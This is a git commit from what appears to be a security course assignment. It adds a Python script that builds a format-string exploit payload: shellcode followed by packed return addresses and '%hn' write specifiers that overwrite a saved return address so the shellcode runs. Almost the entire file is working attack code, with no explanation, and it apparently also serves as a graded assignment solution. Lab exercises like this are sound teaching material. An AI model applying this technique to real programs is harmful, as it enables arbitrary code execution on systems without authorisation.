9f30052633f672c16f57a63ecd2a8f83b78cda94
Birkhoff <zhiqic2@illinois.edu>
2021-02-09 16:42:21 +0800

    Implement 1.2.9

--- AppSec/1.2.9.py
+++ AppSec/1.2.9.py
@@ -5,3 +5,11 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+ret_addr = 0xfffed70c
+payload = shellcode + b'A'
+payload += pack('<I', ret_addr)
+payload += pack('<I', ret_addr + 2)
+payload += b'%52960x%10$hn'
+payload += b'%12542x%11$hn'
+
+sys.stdout.buffer.write(payload)
